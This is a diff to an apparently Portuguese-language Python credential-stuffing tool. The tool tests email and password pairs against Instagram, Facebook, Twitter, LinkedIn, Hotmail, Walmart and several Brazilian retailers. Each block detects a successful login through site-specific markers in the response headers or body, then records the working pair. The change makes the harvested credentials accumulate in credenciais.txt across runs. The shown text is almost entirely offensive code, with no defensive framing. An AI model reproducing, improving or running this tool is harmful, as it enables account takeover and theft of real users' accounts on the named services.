@@ -80,7 +80,7 @@ if(esc == "1"):
         c = str(c)
         if('userId' in c) or ('checkpoint_required' in c):
             print(Fore.YELLOW,Style.BRIGHT,"[+] CREDENTIAL STUFFING > INSTAGRAM: {}:{}".format(email,senha),Style.RESET_ALL)
-            arquivo = open("credenciais.txt","w")
+            arquivo = open("credenciais.txt","a")
             arquivo.write("\n[+] CREDENTIAL STUFFING > INSTAGRAM: {}:{}".format(email,senha))
         else:
             print(Fore.RED,"[-] O USUARIO NÃO USA A MESMA SENHA NO INSTAGRAM.",Style.RESET_ALL)
@@ -93,7 +93,7 @@ if(esc == "1"):
         e = str(fbreq.headers)
         if("checkpoint=" in e) or ('spin=' in e):
             print(Fore.YELLOW,Style.BRIGHT,"[+] CREDENTIAL STUFFING > FACEBOOK: {}:{}".format(email,senha),Style.RESET_ALL)
-            arquivo = open("credenciais.txt","w")
+            arquivo = open("credenciais.txt","a")
             arquivo.write("\n[+] CREDENTIAL STUFFING > FACEBOOK: {}:{}".format(email,senha))
         else:
             print(Fore.RED,"[-] O USUARIO NÃO USA A MESMA SENHA NO FACEBOOK.",Style.RESET_ALL)
@@ -106,7 +106,7 @@ if(esc == "1"):
         reka = str(kabreq.content)
         if('cgi-local/site/principal/home.cgi' in reka):
             print(Fore.YELLOW,Style.BRIGHT,"[+] CREDENTIAL STUFFING > KABUM: {}:{}".format(email,senha),Style.RESET_ALL)
-            arquivo = open("credenciais.txt","w")
+            arquivo = open("credenciais.txt","a")
             arquivo.write("\n[+] CREDENTIAL STUFFING > KABUM: {}:{}".format(email,senha))
         else:
             print(Fore.RED,"[-] O USUARIO NÃO USA A MESMA SENHA NA KABUM.",Style.RESET_ALL)
@@ -122,7 +122,7 @@ if(esc == "1"):
         kanuih = str(kanuireq.headers)
         if('customer_logged=1' in kanuih):
             print(Fore.YELLOW,Style.BRIGHT,"[+] CREDENTIAL STUFFING > KANUI: {}:{}".format(email,senha),Style.RESET_ALL)
-            arquivo = open("credenciais.txt","w")
+            arquivo = open("credenciais.txt","a")
             arquivo.write("\n[+] CREDENTIAL STUFFING > KANUI: {}:{}".format(email,senha))
         else:
             print(Fore.RED,"[-] O USUARIO NÃO USA A MESMA SENHA NA KANUI.",Style.RESET_ALL)
@@ -139,7 +139,7 @@ if(esc == "1"):
         sararesp = str(sarareq.content)
         if('is_logged_in":true' in sararesp):
             print(Fore.YELLOW,Style.BRIGHT,"[+] CREDENTIAL STUFFING > SARAIVA: {}:{}".format(email,senha),Style.RESET_ALL)
-            arquivo = open("credenciais.txt","w")
+            arquivo = open("credenciais.txt","a")
             arquivo.write("\n[+] CREDENTIAL STUFFING > SARAIVA: {}:{}".format(email,senha))
         else:
             print(Fore.RED,"[-] O USUARIO NÃO USA A MESMA SENHA NA SARAIVA.",Style.RESET_ALL)
@@ -156,7 +156,7 @@ if(esc == "1"):
         resp = str(twreq.content)
         if('not redirected soon, please <a href="/">use this link</a>' in resp):
             print(Fore.YELLOW,Style.BRIGHT,"[+] CREDENTIAL STUFFING > TWITTER: {}:{}".format(email,senha),Style.RESET_ALL)
-            arquivo = open("credenciais.txt","w")
+            arquivo = open("credenciais.txt","a")
             arquivo.write("\n[+] CREDENTIAL STUFFING > TWITTER: {}:{}".format(email,senha))
         else:
             print(Fore.RED,"[-] O USUARIO NÃO USA A MESMA SENHA NO TWITTER.",Style.RESET_ALL)
@@ -178,7 +178,7 @@ if(esc == "1"):
         respostalinke = str(linkereq.headers)
         if('sw.js' in respostalinke):
             print(Fore.YELLOW,Style.BRIGHT,"[+] CREDENTIAL STUFFING > LINKEDIN: {}:{}".format(email,senha),Style.RESET_ALL)
-            arquivo = open("credenciais.txt","w")
+            arquivo = open("credenciais.txt","a")
             arquivo.write("\n[+] CREDENTIAL STUFFING > LINKEDIN: {}:{}".format(email,senha))
         else:
             print(Fore.RED,"[-] O USUARIO NÃO USA A MESMA SENHA NO LINKEDIN.",Style.RESET_ALL)
@@ -213,7 +213,7 @@ if(esc == "1"):
         respht = str(htreq.headers)
         if('PPAuth' in respht):
             print(Fore.YELLOW,Style.BRIGHT,"[+] CREDENTIAL STUFFING > HOTMAIL: {}:{}".format(email,senha),Style.RESET_ALL)
-            arquivo = open("credenciais.txt","w")
+            arquivo = open("credenciais.txt","a")
             arquivo.write("\n[+] CREDENTIAL STUFFING > HOTMAIL: {}:{}".format(email,senha))
         else:
             print(Fore.RED,"[-] O USUARIO NÃO USA A MESMA SENHA NO HOTMAIL.",Style.RESET_ALL)
@@ -226,7 +226,7 @@ if(esc == "1"):
         respw = str(walreq.headers)
         if('logged-in=true' in respw):
             print(Fore.YELLOW,Style.DIM,"[+] CREDENTIAL STUFFING > WALMART: {}:{}".format(email,senha),Style.RESET_ALL)
-            arquivo = open("credenciais.txt","w")
+            arquivo = open("credenciais.txt","a")
             arquivo.write("\n[+] CREDENTIAL STUFFING > WALMART: {}:{}".format(email,senha))
         else:
             print(Fore.RED,"[-] O USUÁRIO NÃO USA A MESMA SENHA NA WALMART.",Style.RESET_ALL)
